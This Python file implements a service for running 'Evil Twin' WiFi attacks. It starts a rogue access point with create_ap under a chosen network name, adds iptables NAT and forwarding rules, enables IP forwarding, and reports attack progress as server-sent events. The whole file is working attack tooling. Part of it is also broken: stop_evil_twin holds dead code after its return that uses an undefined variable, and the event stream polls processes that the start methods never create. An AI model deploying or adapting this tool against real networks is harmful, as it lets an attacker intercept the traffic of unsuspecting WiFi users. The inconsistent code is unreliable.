import subprocess
import asyncio
from typing import AsyncGenerator, Dict

from app.helpers.network import enable_monitor, disable_monitor
from app.repositories.wifi_network_repository import WifiNetworkRepository


import logging


class WifiEvilTwinService:
    """
    Service to manage Evil Twin WiFi attacks using create_ap and iptables.
    """

    def __init__(self, db):
        self.repo = WifiNetworkRepository(db)
        self._running_attacks = {}  # key: hotspot_name, value: dict

    async def debug_start_evil_twin(self, channel: str, interface: str, hotspot_name: str) -> str:
        """
        Debug version of start_evil_twin: print/log every step and command output for troubleshooting.
        """
        import sys

        alfa_interface = "wlx00c0cab6a275"
        internet_interface = "wlx00c0cab6a27a"
        key = hotspot_name

        if key in self._running_attacks and self._running_attacks[key]["status"] == "running":
            print(f"[DEBUG] Evil twin already running for {hotspot_name}")
            raise ValueError(f"Evil twin attack already in progress for hotspot '{hotspot_name}'")

        try:
            create_ap_cmd = ["sudo", "create_ap", internet_interface, alfa_interface, hotspot_name]
            print(f"[DEBUG] Running: {' '.join(create_ap_cmd)}")
            create_ap_proc = subprocess.Popen(
                create_ap_cmd,
                stdout=sys.stdout,  # print output
                stderr=sys.stderr,
            )
        except Exception as e:
            print(f"[DEBUG][ERROR] Failed to start create_ap: {e}")
            raise

        await asyncio.sleep(2)

        try:
            print("[DEBUG] Setting up iptables...")
            iptables_cmds = [
                ["sudo", "iptables", "-A", "FORWARD", "-i", "ap0", "-o", internet_interface, "-j", "ACCEPT"],
                [
                    "sudo",
                    "iptables",
                    "-A",
                    "FORWARD",
                    "-i",
                    internet_interface,
                    "-o",
                    "ap0",
                    "-m",
                    "state",
                    "--state",
                    "RELATED,ESTABLISHED",
                    "-j",
                    "ACCEPT",
                ],
                ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", internet_interface, "-j", "MASQUERADE"],
            ]
            for cmd in iptables_cmds:
                print(f"[DEBUG] Running: {' '.join(cmd)}")
                subprocess.run(cmd, check=True)
        except Exception as e:
            print(f"[DEBUG][ERROR] iptables/sysctl failed: {e}")
            create_ap_proc.terminate()
            raise

        try:
            print("[DEBUG] Enabling IP forwarding...")
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        except Exception as e:
            print(f"[DEBUG][ERROR] sysctl failed: {e}")
            create_ap_proc.terminate()
            raise

        self._running_attacks[key] = {
            "create_ap_proc": create_ap_proc,
            "interface": alfa_interface,
            "internet_interface": internet_interface,
            "hotspot_name": hotspot_name,
            "start_time": asyncio.get_event_loop().time(),
            "status": "running",
        }
        await self.repo.update_status(hotspot_name, "EvilTwin")
        print(f"[DEBUG] Evil twin started for hotspot '{hotspot_name}'")
        return hotspot_name

    async def start_evil_twin(self, channel: str, interface: str, hotspot_name: str) -> str:
        """
        Start an Evil Twin attack using create_ap. Returns the hotspot_name as identifier.
        """
        alfa_interface = "wlx00c0cab6a275"
        internet_interface = "wlx00c0cab6a27a"
        key = hotspot_name

        if key in self._running_attacks and self._running_attacks[key]["status"] == "running":
            raise ValueError(f"Evil twin attack already in progress for hotspot '{hotspot_name}'")

        try:
            logging.info(f"[EvilTwin] Starting create_ap for SSID '{hotspot_name}'...")
            create_ap_cmd = ["sudo", "create_ap", internet_interface, alfa_interface, hotspot_name]
            create_ap_proc = subprocess.Popen(
                create_ap_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception as e:
            logging.error(f"[EvilTwin] Failed to start create_ap: {e}")
            raise

        await asyncio.sleep(2)

        try:
            self._setup_iptables(internet_interface)
            self._enable_ip_forwarding()
        except Exception as e:
            logging.error(f"[EvilTwin] Failed to set up iptables/sysctl: {e}")
            create_ap_proc.terminate()
            raise

        self._running_attacks[key] = {
            "create_ap_proc": create_ap_proc,
            "interface": alfa_interface,
            "internet_interface": internet_interface,
            "hotspot_name": hotspot_name,
            "start_time": asyncio.get_event_loop().time(),
            "status": "running",
        }
        await self.repo.update_status(hotspot_name, "EvilTwin")
        logging.info(f"[EvilTwin] Evil twin started for hotspot '{hotspot_name}'")
        return hotspot_name

    def _setup_iptables(self, internet_interface: str):
        """Set up required iptables rules for NAT and forwarding."""
        iptables_cmds = [
            ["sudo", "iptables", "-A", "FORWARD", "-i", "ap0", "-o", internet_interface, "-j", "ACCEPT"],
            [
                "sudo",
                "iptables",
                "-A",
                "FORWARD",
                "-i",
                internet_interface,
                "-o",
                "ap0",
                "-m",
                "state",
                "--state",
                "RELATED,ESTABLISHED",
                "-j",
                "ACCEPT",
            ],
            ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", internet_interface, "-j", "MASQUERADE"],
        ]
        for cmd in iptables_cmds:
            logging.info(f"[EvilTwin] Running iptables: {' '.join(cmd)}")
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _enable_ip_forwarding(self):
        """Enable IP forwarding on the system."""
        logging.info("[EvilTwin] Enabling IP forwarding...")
        subprocess.Popen(
            ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    async def stop_evil_twin(self, hotspot_name: str) -> Dict:
        """
        Stop the Evil Twin attack for the given hotspot_name.
        """
        key = hotspot_name
        if key not in self._running_attacks:
            return {
                "status": "not_found",
                "message": f"No evil twin attack found for hotspot '{hotspot_name}'",
            }
        attack = self._running_attacks[key]
        proc = attack.get("create_ap_proc")
        try:
            if proc and proc.poll() is None:
                logging.info(f"[EvilTwin] Terminating create_ap for '{hotspot_name}'")
                proc.terminate()
                proc.wait(timeout=5)
        except Exception as e:
            logging.warning(f"[EvilTwin] Error terminating create_ap: {e}")
        # Optionally, flush iptables rules here if needed
        attack["status"] = "stopped"
        await self.repo.update_status(hotspot_name, "Main")
        logging.info(f"[EvilTwin] Evil twin stopped for hotspot '{hotspot_name}'")
        return {"status": "stopped", "message": f"Evil twin attack for '{hotspot_name}' stopped"}

        if "dnsmasq_proc" in attack and attack["dnsmasq_proc"].poll() is None:
            attack["dnsmasq_proc"].terminate()
            attack["dnsmasq_proc"].wait()

        if "airbase_proc" in attack and attack["airbase_proc"].poll() is None:
            attack["airbase_proc"].terminate()
            attack["airbase_proc"].wait()

        disable_monitor(attack["interface"])

        subprocess.run(
            ["ifconfig", attack["twin_interface"], "down"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        attack["status"] = "stopped"
        await self.repo.update_status(bssid, "Main")

        return {"status": "stopped", "message": f"Evil twin attack for {bssid} stopped"}

    async def events(self, bssid: str) -> AsyncGenerator[str, None]:
        if bssid not in self._running_attacks:
            yield 'event: error\ndata: {"message":"No evil twin attack found"}\n\n'
            return

        attack = self._running_attacks[bssid]
        start_time = attack["start_time"]
        counter = 0
        yield 'event: start\ndata: {"message":"Evil twin attack started"}\n\n'

        try:
            while attack["status"] == "running":
                current_time = asyncio.get_event_loop().time()
                elapsed = int(current_time - start_time)
                counter += 1

                if attack["airbase_proc"].poll() is not None or attack["dnsmasq_proc"].poll() is not None:
                    await self.stop_evil_twin(bssid)
                    yield 'event: error\ndata: {"message":"Process terminated unexpectedly"}\n\n'
                    return

                yield f'event: progress\ndata: {{"elapsed":{elapsed},"heartbeat":{counter}}}\n\n'

                await asyncio.sleep(1)

            yield 'event: done\ndata: {"message":"Evil twin attack stopped"}\n\n'

        finally:
            if attack["status"] == "running":
                await self.stop_evil_twin(bssid)
